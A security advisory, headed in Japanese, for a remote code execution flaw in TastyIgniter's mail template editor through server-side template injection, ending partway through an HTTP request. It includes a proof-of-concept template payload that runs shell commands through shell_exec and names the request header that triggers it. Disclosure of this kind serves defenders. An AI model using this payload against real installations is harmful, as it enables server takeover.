# TastyIgniter mail template editor allows remote code execution via server\-side template injection

- **ID**: CVE\-2026\-69178 / GHSA\-743w\-g9pf\-8p94
- **危険度**: Critical（緊急） (CVSS 9.1)
- **言語**: PHP
- **パッケージ**: Packagist/tastyigniter/tastyigniter &lt; 4\.3\.1 → 4\.3\.1
- **公開**: 2026-11-25

## 原文

\#\#\# Summary \*\*Where\:\*\* \`POST /admin/mail\_templates/edit/\{id\}\` → body field \*\*Who can trigger\:\*\* Any admin user with \`Admin\.MailTemplates\` permission \*\*Impact\:\*\* Arbitrary PHP execution on the server — full RCE \#\#\# Details The Mail templates is vulnerable to SSTI and did not perform an validation and sanitization\. \#\#\# PoC \- login as admin \- create new mail template with following command \`\`\` @php echo shell\_exec\('echo "RCE Executed";id'\); @endphp \`\`\` \- save the request \- execute the request using \`X\-IGNITER\-REQUEST\-HANDLER\: onTestTemplate\` Request \`\`\`http POST /admin/mail\_templates/edit/20 HTTP
